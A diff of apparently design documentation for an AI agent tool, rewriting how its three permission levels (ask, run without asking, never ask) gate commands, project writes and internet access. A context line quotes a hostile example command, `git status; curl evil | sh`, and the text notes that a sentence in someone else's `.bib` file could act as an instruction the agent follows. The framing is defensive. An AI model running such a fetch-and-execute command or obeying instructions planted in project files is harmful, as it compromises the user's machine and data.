@@ -450,23 +450,51 @@ shell syntax cannot be, since `git status; curl evil | sh` starts with `git`,
 so that one is remembered by its exact text and covers nothing else. What you
 answer is kept with the project, so a restart does not ask you again.
 
-If that is more asking than you want, a switch approves everything except four
-kinds of action, and two more things hold it honest. A write outside the
-project still asks, because that is the one action that leaves what you pointed
-the agent at. A file inside the project that the build itself runs still asks,
-a `latexmkrc` or a `Makefile`, because approving the writing is not approving
-the machinery. A shell command carrying syntax that a first-word rule cannot
-describe still asks, and the card names what it found in it rather than
-guessing. And anything that leaves this machine still asks, because both the
-address and what is sent to it are chosen from files that may have come from
-somebody else. Beyond those, every automatic approval still appears in the
-transcript marked as one, and while the switch is on an **Auto** chip sits
-beside the agent's name, because a fence that is down and says nothing is worse
-than no fence.
+If that is more asking than you want, the control under the box has three
+positions and you choose which one you are in.
 
-**It says what it is doing.** A turn can spend twenty seconds inside a tool
-with no prose arriving, so the header carries a live line: *Reading
-02_theory.tex*, *Searched the literature*, *Writing*.
+**Ask before acting** is the above: a card for every command, every fetch and
+every write that leaves the project. It is the only one of the three that is a
+complete fence, and it is the default.
+
+**Run the work without asking** is the one most people will want. Commands and
+edits run silently, and that includes the piped, chained and redirected
+commands that make up nearly everything a build or a data script actually does.
+Two things still ask. Writing outside the project, or to a file inside it that
+the build itself runs, a `latexmkrc` or a `Makefile`, because approving the
+writing is not approving the machinery. And anything that reaches the internet,
+because both the address and what is sent to it are chosen from files that may
+have come from somebody else. Both of those gain a third answer, *Allow for
+this conversation*, so a run that fetches eleven references asks once instead of
+eleven times.
+
+It is worth being plain about what that position does not promise. It reads the
+command the agent is about to run, not what the command then does, so a script
+it starts can write anywhere you can write and reach anything you can reach.
+That is not a hole to be closed by a longer list of words; it is what running
+somebody's commands means. The first position is the one that asks about all of
+it, which is why it is the default and why it is still there.
+
+**Never ask about anything** does what it says, including for a write that
+leaves the project. Switching it on takes a second press and a sentence saying
+so, because the risk is not really about your own judgement: the agent's
+instructions come partly from your project's own files, and those arrive from
+templates, from clones and from co-authors, so a sentence in somebody else's
+`.bib` file is an instruction it may follow.
+
+Every automatic approval appears in the transcript marked as one, whichever
+position you are in, and at the quietest position that record is the only
+account of what was done. While the fence is down at all, an **Auto** chip sits
+beside the agent's name saying which position it is in, and one click on it
+steps back. A fence that is down and says nothing is worse than no fence.
+
+**It says what it is doing, and for how long.** A turn can spend twenty seconds
+inside a tool, or a while thinking before it says anything, so the header
+carries a live line: *Reading 02_theory.tex*, *Searched the literature*,
+*Thinking*, *Writing*, with a count of seconds beside it once one passes three.
+When the agent writes itself a list of what it means to do, that list is on
+screen and ticks itself off. Every tool call that took more than half a second
+says how long it took.
 
 **It remembers the project, not just the conversation.** Tell it that chapter
 three is frozen, or which measurements came from a collaborator, and it writes
